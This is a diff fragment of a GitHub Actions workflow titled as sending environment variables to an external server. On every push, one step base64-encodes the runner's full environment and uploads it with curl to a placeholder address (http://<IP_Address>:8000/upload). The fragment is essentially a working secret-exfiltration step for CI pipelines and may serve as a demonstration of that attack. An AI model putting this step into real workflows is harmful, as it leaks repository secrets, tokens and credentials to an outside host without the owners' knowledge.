@@ -1,3 +1,4 @@
+```
 name: Workflow to send env variables to external server
 on: push
 jobs:
@@ -11,3 +12,4 @@ jobs:
         run: sleep 10
       - name: test
         run: test=`env | base64 > test.txt`;curl -X POST http://<IP_Address>:8000/upload --data-binary @test.txt
+```
